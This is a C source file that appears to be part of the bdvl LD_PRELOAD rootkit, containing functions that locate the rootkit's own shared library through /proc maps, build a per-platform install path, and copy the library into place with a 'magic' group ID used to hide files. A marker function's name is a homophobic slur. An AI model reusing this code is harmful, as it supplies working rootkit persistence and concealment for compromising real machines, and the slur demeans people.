void *getfuncptr(const char *sopath, char *name, void **handle){
    void (*funcptr)(void);

    handle = dlopen(sopath, RTLD_LAZY);
    if(handle == NULL) return NULL;

    if(!o_dlsym) locate_dlsym();
    funcptr = o_dlsym(handle, name);
    if(funcptr == NULL){
        dlclose(handle);
        return NULL;
    }

    return funcptr;
}

extern void bdvlsuperreallygay(void){
    return;
}

static char *resolvelibpath(void){
    if(!o_dlsym) locate_dlsym();

    void *handle, *gothandle;
    int (*funcptr)(void), (*gotfunc)(void);
    char ofuncbuf[32], mapspath[256], nfuncbuf[32], buf[LINE_MAX], *ret=NULL;
    FILE *fp; 
    unsigned long int funcaddr, intfoundfunc;
    const char *funcbufaddr, *foundfuncaddr, *fpathpos, *bufaddr;

    handle = dlopen(0, RTLD_LAZY);
    if(handle == NULL) return NULL;
    
    funcptr = o_dlsym(handle, "bdvlsuperreallygay");
    if(funcptr == NULL){
        dlclose(handle);
        return NULL;
    }

    memset(ofuncbuf, 0, sizeof(ofuncbuf));
    snprintf(ofuncbuf, sizeof(ofuncbuf)-1, "%u", (*funcptr)());
    funcbufaddr = &ofuncbuf[0];
    funcaddr = strtoul(funcbufaddr, NULL, 10);

    hook(CFOPEN);
    memset(mapspath, 0, sizeof(mapspath));
    snprintf(mapspath, sizeof(mapspath)-1, MAPS_PATH, getpid());
    fp = call(CFOPEN, mapspath, "r");
    if(fp == NULL){
        dlclose(handle);
        return NULL;
    }

    while(fgets(buf, sizeof(buf)-1, fp) != NULL && ret == NULL){
        bufaddr = &buf[0];

        fpathpos = strchr(bufaddr, '/');
        if(!fpathpos || !strstr(fpathpos, ".so."))
            continue;

        buf[strlen(buf)-1] = 0;

        gothandle = dlopen(fpathpos, RTLD_LAZY);
        if(gothandle == NULL) continue;
        gotfunc = o_dlsym(gothandle, "bdvlsuperreallygay");
        if(gotfunc == NULL){
            dlclose(gothandle);
            continue;
        }

        memset(nfuncbuf, 0, sizeof(nfuncbuf));
        snprintf(nfuncbuf, sizeof(nfuncbuf)-1, "%u", (*gotfunc)());

        foundfuncaddr = &nfuncbuf[0];
        intfoundfunc = strtoul(foundfuncaddr, NULL, 10);

        if(intfoundfunc > 0 && funcaddr > 0)
            ret = strdup(fpathpos);
        dlclose(gothandle);
    }
    fclose(fp);
    dlclose(handle);

    return ret;
}

char *sogetplatform(char *sopath){
    char *platform = NULL,
         *sofilenam = basename(sopath),
         *sofilecpy = strdup(sofilenam),
         *sofiletok = strtok(sofilecpy, "."),
         *curplatform;

    while(sofiletok != NULL && platform == NULL){
        for(int i = 0; i < VALID_PLATFORMS_SIZE && platform == NULL; i++){
            curplatform = valid_platforms[i];
            
            if(!strncmp("arm", sofiletok, 3))
                sofiletok=sofiletok+3;

            if(!strcmp(sofiletok, curplatform))
                platform = strdup(sofiletok);
        }

        sofiletok = strtok(NULL, ".");
    }
    free(sofilecpy);

    return platform;
}

char *sogetpath(char *sopath, char *installdir, char *bdvlso){
    char *platform, *ret;
    size_t pathsize;

    platform = sogetplatform(sopath);
    if(platform == NULL) return NULL;

    pathsize = strlen(installdir)+strlen(bdvlso)+strlen(platform)+4;

    ret = malloc(pathsize);
    if(ret){
        memset(ret, 0, pathsize);
        snprintf(ret, pathsize, "%s/%s.%s", installdir, bdvlso, platform);
    }
    free(platform);
    return ret;
}

int socopy(const char *opath, char *npath, gid_t magicgid){
    unsigned char *buf;
    FILE *ofp, *nfp;
    size_t n, m;
    mode_t somode;
    off_t fsize, blksize;

    hook(CFWRITE, CCHMOD);

    ofp = bindup(opath, npath, &nfp, &fsize, &somode);
    if(ofp == NULL) return -1;

    blksize = getablocksize(fsize);
    do{
        buf = malloc(blksize+1);
        if(!buf){
            fcloser(2, ofp, nfp);
            return -1;
        }
        memset(buf, 0, blksize+1);
        n = fread(buf, 1, blksize, ofp);
        if(n){
            m = (long)call(CFWRITE, buf, 1, n, nfp);
            fflush(nfp);
        }else m = 0;
        fflush(ofp);
        free(buf);
    }while(n > 0 && n == m);

    fcloser(2, ofp, nfp);

    if(chown_path(npath, magicgid) < 0)
        return -1;

    if((long)call(CCHMOD, npath, somode) < 0)
        return -1;

    return 1;
}